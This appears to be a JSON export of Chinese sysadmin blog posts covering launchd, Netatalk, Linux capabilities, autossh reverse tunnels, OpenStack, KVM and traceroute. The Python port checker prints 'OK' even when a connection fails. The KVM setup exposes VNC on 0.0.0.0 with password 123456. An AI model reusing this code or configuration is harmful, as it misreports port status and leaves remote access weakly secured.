的手册 DEVICE contains the device numbers, separated by commas, for a character special, block special, regular, directory or NFS file; or ``memory&apos;&apos; for a memory file system node under Tru64 UNIX; or the address of the private data area of a Solaris socket stream; or a kernel reference address that identifies the file (The kernel reference address may be used for FIFO&apos;s, for example.); or the base address or device name of a Linux AX.25 socket device. Usually only the lower thirty two bits of Tru64 UNIX kernel addresses are displayed.cat /proc/devices 发现 Block devices: 259 blkext 8 sd 9 md 65 sd 66 sd 67 sd 68 sd 69 sd 70 sd 71 sd 128 sd 129 sd 130 sd 131 sd 132 sd 133 sd 134 sd 135 sd 253 device-mapper 254 mdp我猜这个8,3 应该是表示这是一个块设备，3表示该设备的编号，通过 fdisk 查看 /dev/sda3 编号是3 进入/dev 目录 ll 查看，果然是这样。 [root@y-3c-a018 dev]# ll | grep sda3 brw-rw---- 1 root disk 8, 3 Aug 12 10:54 sda3","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"mac 定时执行任务","slug":"mac-定时执行任务","date":"2018-08-14T13:05:11.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/31521.html","link":"","permalink":"https://awen.me/posts/31521.html","excerpt":"1.进入目录 cd ~/Library/LaunchAgents/","text":"1.进入目录 cd ~/Library/LaunchAgents/ 创建一个文件，内容如下 ➜ LaunchAgents cat com.autolockscreen.scheduledJobs.plist &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt; &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;com.autolockscreen.scheduledJobs&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;pmset&lt;/string&gt; &lt;string&gt;sleepnow&lt;/string&gt; &lt;/array&gt; &lt;key&gt;StartCalendarInterval&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;Hour&lt;/key&gt; &lt;integer&gt;11&lt;/integer&gt; &lt;key&gt;Minute&lt;/key&gt; &lt;integer&gt;30&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;Hour&lt;/key&gt; &lt;integer&gt;17&lt;/integer&gt; &lt;key&gt;Minute&lt;/key&gt; &lt;integer&gt;30&lt;/integer&gt; &lt;/dict&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt;这个程序表示 11点30 和17点30 执行休眠命令 pmset sleepnow。设置为开机启动 launchctl load com.autolockscreen.scheduledJobs.plist立即启动 launchctl start com.autolockscreen.scheduledJobs.plist","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"自建 timemachine 服务器","slug":"自建-timemachine-服务器","date":"2018-08-06T12:47:38.000Z","updated":"2021-02-26T06:05:29.354Z","comments":true,"path":"posts/18691.html","link":"","permalink":"https://awen.me/posts/18691.html","excerpt":"mac 自带的 timemachine 非常好用， 能够增量备份，可以通过移动硬盘和网络的方式进行数据备份。本文主要介绍自建 timemachine 服务来进行备份。","text":"mac 自带的 timemachine 非常好用， 能够增量备份，可以通过移动硬盘和网络的方式进行数据备份。本文主要介绍自建 timemachine 服务来进行备份。 为什么要自建直接说：之前是定期备份，每次备份就要插上移动硬盘，非常不方便。另外网络备份，如果选用 apple 的设备，那价格太感人了用不起。因此选择自建，局域网内同步除了首次同步需要耗费很长时间，其他还好。 创建备份用户useradd tmbackup passwd tmbackup创建备份目录mkdir timemachinenetatalk安装1.安装必要的包 sudo yum install libdb-devel avahi-devel libacl-devel dbus-glib-devel2.下载 netatalk wget https://nchc.dl.sourceforge.net/project/netatalk/netatalk/3.1.11/netatalk-3.1.11.tar.bz2 tar -xvf netatalk-3.1.11.tar.bz2 &amp;&amp; cd netatalk-3.1.11/ ./configure --with-init-style=redhat-systemd --with-acls --with-pam-confdir=/etc/pam.d --with-afpstats --with-dbus-sysconf-dir=/etc/dbus-1/system.d make sudo make install mkdir ~/timemachine 3.编辑配置文件 sudo vim /usr/local/etc/afp.conf 内容如下 ; ; Netatalk 3.x configuration file ; [Global] ; Global server settings ; [Homes] ; basedir regex = /xxxx ; [My AFP Volume] ; path = /path/to/volume [My Time Machine Volume] path = /home/timemachine # 备份的目录 time machine = yes valid users = tmbackup #备份的用户然后创建目录并设置权限 mkdir /home/timemachine chown tmbackup:tmbackup /home/timemachine 4.设置为开机自启动 systemctl enable netatalk5.启动 netatalk systemctl start netatalk使用 timemachine1.打开访达 2.输入地址连接 3.使用","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"python 元组取第一个下标遇到的坑","slug":"python-元组取第一个下标遇到的坑","date":"2018-07-18T07:35:56.000Z","updated":"2021-02-26T06:05:29.282Z","comments":true,"path":"posts/32523.html","link":"","permalink":"https://awen.me/posts/32523.html","excerpt":"python 获取元组内的下标，如果元组内只有一个值，获取的是该值的第 n 个下标的值，如下所示","text":"python 获取元组内的下标，如果元组内只有一个值，获取的是该值的第 n 个下标的值，如下所示 &gt;&gt;&gt; tup = [(&apos;tom&apos;,&apos;jack&apos;,&apos;ben&apos;),(&apos;ben&apos;)] &gt;&gt;&gt; tup[0][1] &apos;jack&apos; &gt;&gt;&gt; tup[1][0] &apos;b&apos; &gt;&gt;&gt;如果元组内只有一个值，需要获取完整的值则需要在元组后面加上一个， &gt;&gt;&gt; tup = [(&apos;tom&apos;,&apos;jack&apos;,&apos;ben&apos;),(&apos;ben&apos;,)] &gt;&gt;&gt; tup[0][1] &apos;jack&apos; &gt;&gt;&gt; tup[1][0] &apos;ben&apos; &gt;&gt;&gt;","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Linux能力(capability)机制","slug":"Linux能力-capability-机制","date":"2018-07-13T07:55:38.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/48572.html","link":"","permalink":"https://awen.me/posts/48572.html","excerpt":"Linux能力机制概述在以往的UNIX系统上，为了做进程的权限检查，把进程分为两类：特权进程(有效用户ID是0)和非特权进程(有效用户ID是非0)。特权进程可以通过内核所有的权限检查，而非特权进程的检查则是基于进程的身份(有效ID，有效组及补充组信息)进行。","text":"Linux能力机制概述在以往的UNIX系统上，为了做进程的权限检查，把进程分为两类：特权进程(有效用户ID是0)和非特权进程(有效用户ID是非0)。特权进程可以通过内核所有的权限检查，而非特权进程的检查则是基于进程的身份(有效ID，有效组及补充组信息)进行。 从linux内核2.2开始，Linux把超级用户不同单元的权限分开，可以单独的开启和禁止，称为能力(capability)。可以将能力赋给普通的进程，使其可以做root用户可以做的事情。 此时内核在检查进程是否具有某项权限的时候，不再检查该进程的是特权进程还是非特权进程，而是检查该进程是否具有其进行该操作的能力。例如当进程设置系统时间，内核会检查该进程是否有设置系统时间(CAP_SYS_TIME)的能力，而不是检查进程的ID是否为0； 当前Linux系统中共有37项特权，可在/usr/include/linux/capability.h文件中查看 #define CAP_CHOWN 0 #define CAP_DAC_OVERRIDE 1 #define CAP_DAC_READ_SEARCH 2 #define CAP_FOWNER 3 #define CAP_FSETID 4 #define CAP_KILL 5 #define CAP_SETGID 6 #define CAP_SETUID 7 #define CAP_SETPCAP 8 #define CAP_LINUX_IMMUTABLE 9 #define CAP_NET_BIND_SERVICE 10 #define CAP_NET_BROADCAST 11 #define CAP_NET_ADMIN 12 #define CAP_NET_RAW 13 #define CAP_IPC_LOCK 14 #define CAP_IPC_OWNER 15 #define CAP_SYS_MODULE 16 #define CAP_SYS_RAWIO 17 #define CAP_SYS_CHROOT 18 #define CAP_SYS_PTRACE 19 #define CAP_SYS_PACCT 20 #define CAP_SYS_ADMIN 21 #define CAP_SYS_BOOT 22 #define CAP_SYS_NICE 23 #define CAP_SYS_RESOURCE 24 #define CAP_SYS_TIME 25 #define CAP_SYS_TTY_CONFIG 26 #define CAP_MKNOD 27 #define CAP_LEASE 28 #define CAP_AUDIT_WRITE 29 #define CAP_AUDIT_CONTROL 30 #define CAP_SETFCAP 31 #define CAP_MAC_OVERRIDE 32 #define CAP_MAC_ADMIN 33 #define CAP_SYSLOG 34 #define CAP_WAKE_ALARM 35 #define CAP_BLOCK_SUSPEND 36Linux能力机制的实现一个完整的能力机制需要满足以下三个条件: 1、对进程的所有特权操作，linux内核必须检查该进程该操作的特权位是否使能。 2、Linux内核必须提供系统调用，允许进程能力的修改与恢复。 3、文件系统必须支持能力机制可以附加到一个可执行文件上，但文件运行时，将其能力附加到进程当中。 到linux内核版本2.6.24为止，上述条件的1、2可以满足。从linux内核2.6.24开始，上述3个条件可以都可以满足 每个进程包括三个能力集，含义如下： Permitted: 它是effective capabilities和Inheritable capability的超集。如果一个进程在Permitted集合中丢失一个能力，它无论如何不能再次获取该能力(除非特权用户再次赋予它) Inheritable: 它是表明该进程可以通过execve继承给新进程的能力。 Effecitive: Linux内核真正检查的能力集。 从2.6.24开始，Linux内核可以给可执行文件赋予能力，可执行文件的三个能力集含义如下： Permitted:该能力当可执行文件执行时自动附加到进程中，忽略Inhertiable capability。 Inheritable:它与进程的Inheritable集合做与操作，决定执行execve后新进程的Permitted集合。 Effective: 文件的Effective不是一个集合，而是一个单独的位，用来决定进程成的Effective集合。 有上述描述可知，Linux系统中的能力分为两部分，一部分是进程能力，一部分是文件能力，而Linux内核最终检查的是进程能力中的Effective。而文件能力和进程能力中的其他部分用来完整能力继承、限制等方面的内容。 查看某个进程的能力 # cat /proc/62598/status Name: supervisord Umask: 0022 State: S (sleeping) Tgid: 62598 Ngid: 0 Pid: 62598 PPid: 1 TracerPid: 0 Uid: 0 0 0 0 Gid: 0 0 0 0 FDSize: 64 Groups: VmPeak: 221404 kB VmSize: 221404 kB VmLck: 0 kB VmPin: 0 kB VmHWM: 12080 kB VmRSS: 12080 kB RssAnon: 10940 kB RssFile: 1140 kB RssShmem: 0 kB VmData: 10116 kB VmStk: 132 kB VmExe: 4 kB VmLib: 10396 kB VmPTE: 236 kB VmSwap: 0 kB Threads: 1 SigQ: 1/6978 SigPnd: 0000000000000000 ShdPnd: 0000000000000000 SigBlk: 0000000000000000 SigIgn: 0000000001001000 SigCgt: 0000000180014807 CapInh: 0000000000000000 CapPrm: 0000001fffffffff CapEff: 0000001fffffffff CapBnd: 0000001fffffffff CapAmb: 0000000000000000 Seccomp: 0 SpeculationStoreBypass: vulnerable Cpus_allowed: ffffffff,ffffffff Cpus_allowed_list: 0-63 Mems_allowed: 00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001 Mems_allowed_list: 0 voluntary_ctxt_switches: 22260 nonvoluntary_ctxt_switches: 2","categories":[],"tags":[]},{"title":"python3 使用正则匹配 IP 并检测端口","slug":"python3-使用正则匹配-IP-并检测端口","date":"2018-07-12T07:55:51.000Z","updated":"2021-02-26T06:05:29.287Z","comments":true,"path":"posts/32223.html","link":"","permalink":"https://awen.me/posts/32223.html","excerpt":"我们要通过正则去获取一段信息中与之匹配的内容，需要使用到正则表达式，Python 的 re 模块，要判断端口是否打开则可以使用 socket 模块，具体代码如下:","text":"我们要通过正则去获取一段信息中与之匹配的内容，需要使用到正则表达式，Python 的 re 模块，要判断端口是否打开则可以使用 socket 模块，具体代码如下: 代码# import re # ticket_info = &quot;服务器怎么无法远程连接了,IP 地址是59.111.104.113,麻烦帮我看下&quot; import re import socket pattern = re.compile(r&apos;((?:(?:25[0-5]|2[0-4]\\d|(?:1\\d{2}|[1-9]?\\d))\\.){3}(?:25[0-5]|2[0-4]\\d|(?:1\\d{2}|[1-9]?\\d)))&apos;) # 查找数字 ip_info = pattern.findall(ticket_info) if ip_info[0] is not None: for port in [22,3389,80,443]: sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sk.settimeout(1) try: sk.connect((ip_info[0],port)) print(&quot;Server: %s port %s OK!&quot; %(ip_info[0],port)) except Exception: print(&quot;Server: %s port %s OK!&quot; % (ip_info[0], port)) sk.close()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"ssh 反向代理","slug":"ssh-反向代理","date":"2018-07-05T12:29:23.000Z","updated":"2021-02-26T06:05:29.292Z","comments":true,"path":"posts/53554.html","link":"","permalink":"https://awen.me/posts/53554.html","excerpt":"可以通过 SSH 的方式在一个内网访问另外一个内网，我们把他称为 SSH 反向代理","text":"可以通过 SSH 的方式在一个内网访问另外一个内网，我们把他称为 SSH 反向代理 原理 1.首先 内网机器 10.1.100.12 通过 SSH 反向代理连接到公网服务器 121.42.110.23，并且映射一个端口给公网服务器，假设这个端口是333；2.客户端192.168.10.11 通过隧道连接到公网 IP 的333端口，并在本地起一个 socks5 端口，通过连接这个端口实现访问10.1.100.12 网段内的资源 方法一直接使用原生 SSH，但是该方法会导致 SSH 断网从而网络中断。不稳定 方案二使用 autossh，本文主要讲解这个方案 内网机器A 配置1.安装 supervisor 和 autossh yum -y install epel-release yum -y install supervisor autossh 2.配置 /etc/supervisord.conf，内容如下 [unix_http_server] file=/tmp/supervisor.sock ; (the path to the socket file) [supervisord] logfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log) logfile_maxbytes=50MB ; (max main logfile bytes b4 rotation;default 50MB) logfile_backups=10 ; (num of main logfile rotation backups;default 10) loglevel=info ; (log level;default info; others: debug,warn,trace) pidfile=/tmp/supervisord.pid ; (supervisord pidfile;default supervisord.pid) nodaemon=false ; (start in foreground if true;default false) minfds=1024 ; (min. avail startup file descriptors;default 1024) minprocs=200 ; (min. avail process descriptors;default 200) [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [program:autossh] command=/usr/bin/autossh -M 7281 -fCNR 7280:localhost:22 root@1.1.1.1 autostart=true startsecs=10 autorestart=true startretries=3其中 /usr/bin/autossh -M 7281 -fCNR 7280:localhost:22 root@1.1.1.1 -M 7281 启动一个监听端口，如果 ssh 端口则自动启动进程 -f 后台运行 C 压缩数据包 N 不允许执行远程命令 R 7280:localhost:22 将内网主机的22端口和 VPS 的1234端口绑定，相当于远程端口映射 在连接时候配置ssh 密钥连接，建议所有机器都做 ssh-keygen -t rsa ssh-copy-id root@xxxxx2.启动 systemctl enable supervisord systemctl start supervisord公网机器不需要做什么特别的配置，不过建议所有的 ssh 配置都设置下下面的参数。另外放行下相关端口 UseDNS no ClientAliveInterval 60 ClientAliveCountMax 3 GSSAPIAuthentication no GatewayPorts yes内网机器 B方案1 1.以 mac 客户端为例，安装 autossh brew install autossh2.配置文件 ~/Library/LaunchAgents/homebrew.mxcl.autossh.plist &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt; &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;homebrew.mxcl.autossh&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/local/bin/autossh&lt;/string&gt; &lt;string&gt;-M&lt;/string&gt; &lt;string&gt;8111&lt;/string&gt; &lt;string&gt;-N&lt;/string&gt; &lt;string&gt;xxx@vpn&lt;/string&gt; &lt;string&gt;-D&lt;/string&gt; &lt;string&gt;localhost:6080&lt;/string&gt; &lt;string&gt;-C&lt;/string&gt; &lt;string&gt;-i&lt;/string&gt; &lt;string&gt;/Users/wenjun/.ssh/id_rsa&lt;/string&gt; &lt;/array&gt; &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;/plist&gt;3.设置为开机启动 launchctl load ~/Library/LaunchAgents/homebrew.mxcl.autossh.plist4.配置 socks5 为 127.0.0.1:6080,配合 surge 可以实现根据域名代理，非常的方便。 不过似乎这种方式如果长时间不连接就有问题，我现在使用方案2 方案2 使用 SSH proxy，简单配置下即可。需要使用的时候开启下即可。 方案3 直接在服务端配置 socks5，不过这种方案安全性非常低。万一被人扫到 socks 端口会十分的不安全，不推荐。","categories":[],"tags":[]},{"title":"给那些第一句话就问你在不在的人一个小小的调侃","slug":"给那些第一句话就问你在不在的人一个小小的调侃","date":"2018-07-05T04:48:00.000Z","updated":"2021-02-26T06:05:29.351Z","comments":true,"path":"posts/32316.html","link":"","permalink":"https://awen.me/posts/32316.html","excerpt":"很多时候，我是特别讨厌上来第一句话就微信找你问 在？在吗？在干嘛的人！有事直接说事，问个在真的是句废话啊！因此决定对于此类回复，我调侃下给我回复这些的人。 当他们给我回复在或在吗之类的，我就自动回复他一句话，如图所示","text":"很多时候，我是特别讨厌上来第一句话就微信找你问 在？在吗？在干嘛的人！有事直接说事，问个在真的是句废话啊！因此决定对于此类回复，我调侃下给我回复这些的人。 当他们给我回复在或在吗之类的，我就自动回复他一句话，如图所示 本实验在 mac 环境下，其他环境未测试。 编写正则表达式正则表达式如果不是特别数量的话，是比较困难的，可以去这里调试，比如我下面这个，对于回复这内容一开始就是包括这些词的都匹配。 (^在(:?吗|干嘛|不|忙不|上班吗)|^可在|^在)如图所示 ![](https://file.awen.me/blog/63595.png!awen)测试正则，可以通过 http://tool.chinaz.com/regex 去测试是否满足条件 设置自动回复mac 利用这个插件 点击微信小助手–自动回复，如图所示设置，把正则表达式粘贴进去，开启正则匹配就可以了。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Openstack的 cinder 和 nova 组件详解","slug":"Openstack的-cinder-和-nova-组件详解","date":"2018-07-04T22:00:37.000Z","updated":"2021-02-26T06:05:29.261Z","comments":true,"path":"posts/16618.html","link":"","permalink":"https://awen.me/posts/16618.html","excerpt":"nova主要组成: nova-api nova-scheduler nova-compute nova-conductor","text":"nova主要组成: nova-api nova-scheduler nova-compute nova-conductor cinder主要组成: cinder-api cinder-scheduler cinder-volumecinder 工作流程cinder各组件功能： Cinder-api 是 cinder 服务的 endpoint，提供 rest 接口，负责处理 client 请求，并将 RPC 请求发送至 cinder-scheduler 组件。 nova 工作流程 nova-api通过rpc.call向nova-scheduler请求是否有创建虚拟机的资源(Host ID)。 nova-scheduler进程侦听消息队列，获取nova-api的请求。 nova-scheduler通过查询nova数据库中计算资源的情况，并通过调度算法计算符合虚拟机创建需要的主机。 对于有符合虚拟机创建的主机，nova-scheduler更新数据库中虚拟机对应的物理主机信息。 nova-scheduler通过rpc.cast向nova-compute发送对应的创建虚拟机请求的消息。 nova-compute会从对应的消息队列中获取创建虚拟机请求的消息。 nova-compute通过rpc.call向nova-conductor请求获取虚拟机消息。（Flavor） nova-conductor从消息队队列中拿到nova-compute请求消息。 nova-conductor根据消息查询虚拟机对应的信息。 nova-conductor从数据库中获得虚拟机对应信息。 nova-conductor把虚拟机信息通过消息的方式发送到消息队列中。 nova-compute从对应的消息队列中获取虚拟机信息消息。 nova-compute通过keystone的RESTfull API拿到认证的token，并通过HTTP请求glance-api获取创建虚拟机所需要镜像。 整体工作流程","categories":[],"tags":[{"name":"openstack","slug":"openstack","permalink":"https://awen.me/tags/openstack/"}]},{"title":"KVM 安装 Windows 系统","slug":"KVM-安装-Windows-系统","date":"2018-07-04T08:53:14.000Z","updated":"2021-02-26T06:05:29.251Z","comments":true,"path":"posts/56136.html","link":"","permalink":"https://awen.me/posts/56136.html","excerpt":"创建磁盘qemu-img create -f qcow2 /home/kvm/images/windows2008r2.img 40g","text":"创建磁盘qemu-img create -f qcow2 /home/kvm/images/windows2008r2.img 40g 创建 Windows 虚拟机 virt-install \\ --name windows2008r264 \\ --ram 2048 \\ --disk path=/home/kvm/images/windows2008r2.img \\ --vcpus 2 \\ --os-type windows \\ --os-variant win2k8 \\ --network bridge=br0,model=virtio \\ --network bridge=br0,model=virtio \\ --graphics vnc,listen=0.0.0.0,port=5900,password=123456 \\ --autostart\\ --cdrom=/home/kvm/os/win2008.iso 执行后如下所示 WARNING Graphics requested but DISPLAY is not set. Not running virt-viewer. WARNING No console to launch for the guest, defaulting to --wait -1 Starting install... Domain installation still in progress. Waiting for installation to complete. 打开 VNC 客户端输入 IP:5900,密码是123456 查看 [root@y-3c-a018 images]# virsh list --all Id Name State ---------------------------------------------------- 1 node-server-3 running 2 node-server-1 running 3 node-server-2 running 12 windows2008r264 running - node-backup shut off配置 [root@y-3c-a018 qemu]# cat windows2008r264.xml &lt;!-- WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE OVERWRITTEN AND LOST. Changes to this xml configuration should be made using: virsh edit windows2008r264 or other application using the libvirt API. --&gt; &lt;domain type=&apos;kvm&apos;&gt; &lt;name&gt;windows2008r264&lt;/name&gt; &lt;uuid&gt;ec323b07-94c4-4413-9ff1-1c250076fce1&lt;/uuid&gt; &lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt; &lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt; &lt;vcpu placement=&apos;static&apos;&gt;2&lt;/vcpu&gt; &lt;os&gt; &lt;type arch=&apos;x86_64&apos; machine=&apos;pc-i440fx-rhel7.0.0&apos;&gt;hvm&lt;/type&gt; &lt;boot dev=&apos;hd&apos;/&gt; &lt;/os&gt; &lt;features&gt; &lt;acpi/&gt; &lt;apic/&gt; &lt;hyperv&gt; &lt;relaxed state=&apos;on&apos;/&gt; &lt;vapic state=&apos;on&apos;/&gt; &lt;spinlocks state=&apos;on&apos; retries=&apos;8191&apos;/&gt; &lt;/hyperv&gt; &lt;/features&gt; &lt;cpu mode=&apos;custom&apos; match=&apos;exact&apos; check=&apos;partial&apos;&gt; &lt;model fallback=&apos;allow&apos;&gt;Skylake-Client-IBRS&lt;/model&gt; &lt;/cpu&gt; &lt;clock offset=&apos;localtime&apos;&gt; &lt;timer name=&apos;rtc&apos; tickpolicy=&apos;catchup&apos;/&gt; &lt;timer name=&apos;pit&apos; tickpolicy=&apos;delay&apos;/&gt; &lt;timer name=&apos;hpet&apos; present=&apos;no&apos;/&gt; &lt;timer name=&apos;hypervclock&apos; present=&apos;yes&apos;/&gt; &lt;/clock&gt; &lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt; &lt;on_reboot&gt;restart&lt;/on_reboot&gt; &lt;on_crash&gt;destroy&lt;/on_crash&gt; &lt;pm&gt; &lt;suspend-to-mem enabled=&apos;no&apos;/&gt; &lt;suspend-to-disk enabled=&apos;no&apos;/&gt; &lt;/pm&gt; &lt;devices&gt; &lt;emulator&gt;/usr/libexec/qemu-kvm&lt;/emulator&gt; &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos;/&gt; &lt;source file=&apos;/home/kvm/images/windows2008r2.img&apos;/&gt; &lt;target dev=&apos;hda&apos; bus=&apos;ide&apos;/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;0&apos; target=&apos;0&apos; unit=&apos;0&apos;/&gt; &lt;/disk&gt; &lt;disk type=&apos;file&apos; device=&apos;cdrom&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;raw&apos;/&gt; &lt;source file=&apos;/home/kvm/os/win2008.iso&apos;/&gt; &lt;target dev=&apos;hdb&apos; bus=&apos;ide&apos;/&gt; &lt;readonly/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;0&apos; target=&apos;0&apos; unit=&apos;1&apos;/&gt; &lt;/disk&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-ehci1&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x05&apos; function=&apos;0x7&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci1&apos;&gt; &lt;master startport=&apos;0&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x05&apos; function=&apos;0x0&apos; multifunction=&apos;on&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci2&apos;&gt; &lt;master startport=&apos;2&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x05&apos; function=&apos;0x1&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci3&apos;&gt; &lt;master startport=&apos;4&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x05&apos; function=&apos;0x2&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;pci&apos; index=&apos;0&apos; model=&apos;pci-root&apos;/&gt; &lt;controller type=&apos;ide&apos; index=&apos;0&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x01&apos; function=&apos;0x1&apos;/&gt; &lt;/controller&gt; &lt;interface type=&apos;bridge&apos;&gt; &lt;mac address=&apos;52:54:00:7a:5b:72&apos;/&gt; &lt;source bridge=&apos;br0&apos;/&gt; &lt;model type=&apos;rtl8139&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x03&apos; function=&apos;0x0&apos;/&gt; &lt;/interface&gt; &lt;interface type=&apos;bridge&apos;&gt; &lt;mac address=&apos;52:54:00:ee:59:5d&apos;/&gt; &lt;source bridge=&apos;br0&apos;/&gt; &lt;model type=&apos;virtio&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x0&apos;/&gt; &lt;/interface&gt; &lt;serial type=&apos;pty&apos;&gt; &lt;target type=&apos;isa-serial&apos; port=&apos;0&apos;&gt; &lt;model name=&apos;isa-serial&apos;/&gt; &lt;/target&gt; &lt;/serial&gt; &lt;console type=&apos;pty&apos;&gt; &lt;target type=&apos;serial&apos; port=&apos;0&apos;/&gt; &lt;/console&gt; &lt;input type=&apos;tablet&apos; bus=&apos;usb&apos;&gt; &lt;address type=&apos;usb&apos; bus=&apos;0&apos; port=&apos;1&apos;/&gt; &lt;/input&gt; &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt; &lt;input type=&apos;keyboard&apos; bus=&apos;ps2&apos;/&gt; &lt;graphics type=&apos;vnc&apos; port=&apos;5900&apos; autoport=&apos;no&apos; listen=&apos;0.0.0.0&apos; passwd=&apos;123456&apos;&gt; &lt;listen type=&apos;address&apos; address=&apos;0.0.0.0&apos;/&gt; &lt;/graphics&gt; &lt;video&gt; &lt;model type=&apos;vga&apos; vram=&apos;16384&apos; heads=&apos;1&apos; primary=&apos;yes&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x02&apos; function=&apos;0x0&apos;/&gt; &lt;/video&gt; &lt;memballoon model=&apos;virtio&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x06&apos; function=&apos;0x0&apos;/&gt; &lt;/memballoon&gt; &lt;/devices&gt; &lt;/domain&gt;使用 virtio 驱动可以这样创建虚拟机 1.安装virtio 驱动 wget https://fedorapeople.org/groups/virt/virtio-win/virtio-win.repo -O /etc/yum.repos.d/virtio-win.repo yum install virtio-win -y2.创建虚拟机 virt-install \\ --name windows2008r264 \\ --ram 2048 \\ --disk path=/home/kvm/images/windows2008r2.img \\ --vcpus 2 \\ --os-type windows \\ --os-variant win2k8 \\ --disk path=/usr/share/virtio-win/virtio-win-0.1.141_amd64.vfd,device=floppy \\ --network bridge=br0,model=virtio \\ --network bridge=br0,model=virtio \\ --graphics vnc,listen=0.0.0.0,port=5900,password=123456 \\ --autostart\\ --cdrom=/home/kvm/os/win2008.iso然后加载的时候选择加载驱动–浏览，然后选择对应操作系统的驱动 进入系统后查看网卡驱动类型就是千兆的了。","categories":[],"tags":[]},{"title":"如何排查能 ping 通 但是端口访问不通的问题","slug":"如何排查能-ping-通-但是端口访问不通的问题","date":"2018-07-02T08:03:34.000Z","updated":"2021-02-26T06:05:29.328Z","comments":true,"path":"posts/57901.html","link":"","permalink":"https://awen.me/posts/57901.html","excerpt":"问题有时候我们会遇到这样的问题，ping 一个 IP 地址是 ok 的，但是 Telnet 端口就不通，而在其他环境测试是 ok的，那么怎么判断是哪里出了问题呢？","text":"问题有时候我们会遇到这样的问题，ping 一个 IP 地址是 ok 的，但是 Telnet 端口就不通，而在其他环境测试是 ok的，那么怎么判断是哪里出了问题呢？ 这个时候我们可以使用 traceroute 来测试，但是默认 traceroute 是发送 ICMP 包的。因此我们要指定其使用 tcp 协议并指定要检测的端口，具体如下 traceroute -n -T -p [port] ip-n 直接使用 IP 地址-T 使用 tcp 协议-p 指定端口ip 需要检测的目标 IP 比如说我们测试，下面这个图就说明这个目标 IP 的 80 端口是可达的。 但是下图到第 9 跳124.160.189.226 就不通了。说明从这一跳后面 80端口就被干掉了。而这一跳是联通的，因此需要反馈联通运营商确认下。 